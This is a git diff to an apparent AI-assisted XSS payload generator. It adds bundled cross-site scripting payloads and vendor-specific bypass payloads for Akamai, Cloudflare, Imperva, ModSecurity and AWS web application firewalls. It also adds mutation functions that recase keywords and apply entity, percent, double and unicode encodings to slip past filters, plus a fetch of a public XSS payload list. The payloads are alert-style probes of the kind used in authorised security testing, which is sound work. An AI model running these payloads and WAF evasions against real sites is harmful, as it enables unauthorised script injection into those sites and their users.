@@ -1,8 +1,14 @@
 from __future__ import annotations
 
+import html
+from itertools import cycle
+import re
 from dataclasses import replace
+from urllib.parse import quote
 
-from ai_xss_generator.types import ParsedContext, PayloadCandidate
+import requests
+
+from ai_xss_generator.types import ParsedContext, PayloadCandidate, PayloadGenerationOptions
 
 
 BASE_PAYLOADS: list[PayloadCandidate] = [
@@ -176,6 +182,254 @@ BASE_PAYLOADS: list[PayloadCandidate] = [
     ),
 ]
 
+PUBLIC_PAYLOAD_FEEDS = (
+    "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
+)
+
+BUNDLED_PUBLIC_PAYLOADS = (
+    '"><svg/onload=confirm?.(1)>',
+    "<img src=x onerror=confirm?.(1)>",
+    "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)>x</a></svg>",
+    "<body onpageshow=alert(1)>",
+    "<iframe srcdoc='<img src=x onerror=alert(1)>'>",
+    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+    "<marquee onstart=alert(1)>x</marquee>",
+    "<video><source onerror=alert(1)>",
+    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
+    "<math href='javascript:alert(1)'>CLICKME</math>",
+)
+
+WAF_BYPASS_PAYLOADS: dict[str, list[str]] = {
+    "akamai": [
+        "%3Csvg%2Fonload%3Dalert%281%29%3E",
+        "&#x3C;img src=x onerror=alert(1)&#x3E;",
+        "jaVasCript:alert(1)",
+    ],
+    "cloudflare": [
+        "<svg/onload=alert?.(1)>",
+        "%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",
+        "<iframe srcdoc='<svg onload=alert(1)>'>",
+    ],
+    "imperva": [
+        "<details open ontoggle=alert(1)>",
+        "<math><mtext><img src=x onerror=alert(1)>",
+        "\\u003cimg src=x onerror=alert(1)\\u003e",
+    ],
+    "modsecurity": [
+        "<svg%0Aonload=alert(1)>",
+        "x' onmouseover='alert(1)' x='",
+        "[]['filter']['constructor']('alert(1)')()",
+    ],
+    "aws": [
+        "%253Csvg%252Fonload%253Dalert%25281%2529%253E",
+        "<object data='data:text/html,<script>alert(1)</script>'></object>",
+        "&#x3c;svg/onload=alert(1)&#x3e;",
+    ],
+    "awswaf": [
+        "%253Csvg%252Fonload%253Dalert%25281%2529%253E",
+        "<object data='data:text/html,<script>alert(1)</script>'></object>",
+        "&#x3c;svg/onload=alert(1)&#x3e;",
+    ],
+}
+
+WAF_STRATEGY_NOTES = {
+    "akamai": "Favor case shifts and single-pass decoding probes.",
+    "cloudflare": "Favor percent-encoding and nested HTML document probes.",
+    "imperva": "Favor uncommon HTML namespaces and escaped markup variants.",
+    "modsecurity": "Favor newline-separated tag syntax and JS constructor gadgets.",
+    "aws": "Favor double-decoding probes and alternate container elements.",
+    "awswaf": "Favor double-decoding probes and alternate container elements.",
+}
+
+
+def _mixed_case_keywords(value: str) -> str:
+    def replace_keyword(match: re.Match[str]) -> str:
+        pattern = cycle((str.upper, str.lower))
+        return "".join(next(pattern)(char) for char in match.group(0))
+
+    return re.sub(r"script|javascript|alert|onerror|onload", replace_keyword, value, flags=re.IGNORECASE)
+
+
+def _html_entity_variant(value: str) -> str:
+    return "".join(
+        {
+            "<": "&#x3c;",
+            ">": "&#x3e;",
+            '"': "&quot;",
+            "'": "&#x27;",
+        }.get(char, char)
+        for char in value
+    )
+
+
+def _js_unicode_variant(value: str) -> str:
+    return "".join(
+        {
+            "<": "\\u003c",
+            ">": "\\u003e",
+            '"': "\\u0022",
+            "'": "\\u0027",
+            "/": "\\u002f",
+        }.get(char, char)
+        for char in value
+    )
+
+
+def _public_payload_candidate(payload: str, *, source: str) -> PayloadCandidate:
+    return PayloadCandidate(
+        payload=payload,
+        title="Public payload corpus",
+        explanation="Loaded from a public XSS payload corpus or the bundled offline fallback set.",
+        test_vector="Replay against the highest-confidence reflected or DOM sink.",
+        tags=["public", "corpus", "evasion"],
+        source=source,
+    )
+
+
+def _fetch_remote_public_payloads() -> list[PayloadCandidate]:
+    for feed in PUBLIC_PAYLOAD_FEEDS:
+        try:
+            response = requests.get(feed, timeout=1.5, headers={"User-Agent": "axss/0.1"})
+            response.raise_for_status()
+        except Exception:
+            continue
+
+        payloads: list[PayloadCandidate] = []
+        seen: set[str] = set()
+        for line in response.text.splitlines():
+            payload = line.strip()
+            if not payload or payload.startswith("#") or len(payload) > 300:
+                continue
+            if payload in seen:
+                continue
+            seen.add(payload)
+            payloads.append(_public_payload_candidate(payload, source="public-remote"))
+            if len(payloads) >= 24:
+                return payloads
+    return []
+
+
+def fetch_public_payloads() -> list[PayloadCandidate]:
+    remote = _fetch_remote_public_payloads()
+    if remote:
+        return remote
+    return [_public_payload_candidate(payload, source="public-bundled") for payload in BUNDLED_PUBLIC_PAYLOADS]
+
+
+def mutate_bypass_payload(payload: str, waf: str = "") -> list[PayloadCandidate]:
+    raw_payload = payload.strip()
+    if not raw_payload:
+        return []
+
+    waf_key = waf.strip().lower().replace("-", "")
+    variants: list[tuple[str, str, str, list[str]]] = [
+        (
+            raw_payload,
+            "Supplied bypass seed",
+            "Uses the caller-provided payload string as the seed candidate.",
+            ["bypass", "seed"],
+        ),
+        (
+            _mixed_case_keywords(raw_payload),
+            "Keyword case mutation",
+            "Shifts keyword casing to probe naive deny-lists and signature matching.",
+            ["bypass", "case-variant"],
+        ),
+        (
+            _html_entity_variant(raw_payload),
+            "HTML entity mutation",
+            "Encodes markup metacharacters for decode-before-render paths.",
+            ["bypass", "html-entity"],
+        ),
+        (
+            quote(raw_payload, safe=""),
+            "Percent-encoded mutation",
+            "Encodes the full payload for URL or redirect sinks that decode before rendering.",
+            ["bypass", "percent-encoding"],
+        ),
+        (
+            quote(quote(raw_payload, safe=""), safe=""),
+            "Double-encoded mutation",
+            "Targets multi-stage decoding and some edge WAF normalization paths.",
+            ["bypass", "double-encoding"],
+        ),
+        (
+            _js_unicode_variant(raw_payload),
+            "JS unicode mutation",
+            "Useful when attacker input lands in a JavaScript string before DOM insertion.",
+            ["bypass", "unicode-escape"],
+        ),
+    ]
+
+    if waf_key in WAF_STRATEGY_NOTES:
+        variants.append(
+            (
+                html.escape(raw_payload, quote=True),
+                f"{waf.strip() or waf_key} HTML-escaped variant",
+                WAF_STRATEGY_NOTES[waf_key],
+                ["bypass", "waf", waf_key],
+            )
+        )
+
+    candidates: list[PayloadCandidate] = []
+    seen: set[str] = set()
+    for candidate, title, explanation, tags in variants:
+        if not candidate or candidate in seen:
+            continue
+        seen.add(candidate)
+        candidates.append(
+            PayloadCandidate(
+                payload=candidate,
+                title=title,
+                explanation=explanation,
+                test_vector="Inject the mutated candidate into the same sink as the original payload and compare normalization.",
+                tags=tags,
+                source="bypass",
+            )
+        )
+    return candidates
+
+
+def waf_payloads(waf: str, bypass_seed: str = "") -> list[PayloadCandidate]:
+    waf_label = waf.strip()
+    waf_key = waf_label.lower().replace("-", "")
+    if not waf_key:
+        return []
+
+    candidates: list[PayloadCandidate] = []
+    seen: set[str] = set()
+    for payload in WAF_BYPASS_PAYLOADS.get(waf_key, []):
+        if payload in seen:
+            continue
+        seen.add(payload)
+        candidates.append(
+            PayloadCandidate(
+                payload=payload,
+                title=f"{waf_label or waf_key} bypass probe",
+                explanation=WAF_STRATEGY_NOTES.get(waf_key, "WAF-oriented encoding and parser differential probe."),
+                test_vector=f"Replay against the suspected {waf_label or waf_key} edge and compare response normalization.",
+                tags=["waf", waf_key, "evasion"],
+                source="waf",
+            )
+        )
+
+    if bypass_seed:
+        for candidate in mutate_bypass_payload(bypass_seed, waf=waf_key):
+            payload = candidate.payload
+            if payload in seen:
+                continue
+            seen.add(payload)
+            candidates.append(
+                replace(
+                    candidate,
+                    title=f"{waf_label or waf_key} {candidate.title}",
+                    explanation=WAF_STRATEGY_NOTES.get(waf_key, candidate.explanation),
+                    tags=list(dict.fromkeys([*candidate.tags, "waf", waf_key])),
+                    source="waf",
+                )
+            )
+    return candidates
+
 
 def _framework_payloads(context: ParsedContext) -> list[PayloadCandidate]:
     payloads: list[PayloadCandidate] = []
@@ -277,6 +531,26 @@ def base_payloads_for_context(context: ParsedContext) -> list[PayloadCandidate]:
     payloads.extend(_framework_payloads(context))
     payloads.extend(_sink_payloads(context))
     payloads.extend(_input_payloads(context))
+    return payloads
+
+
+def payloads_for_options(
+    context: ParsedContext,
+    options: PayloadGenerationOptions,
+) -> list[PayloadCandidate]:
+    payloads: list[PayloadCandidate] = []
+    if options.public:
+        payloads.extend(fetch_public_payloads())
+    if options.bypass:
+        payloads.extend(mutate_bypass_payload(options.bypass, waf=options.waf))
+    if options.waf:
+        payloads.extend(waf_payloads(options.waf, bypass_seed=options.bypass))
+        context.notes.append(f"WAF bypass mode enabled for {options.waf}.")
+    if options.public:
+        context.notes.append("Public payload corpus enabled.")
+    if options.bypass:
+        context.notes.append("Bypass mutation mode enabled.")
+    context.notes = list(dict.fromkeys(context.notes))
     return payloads
 
 
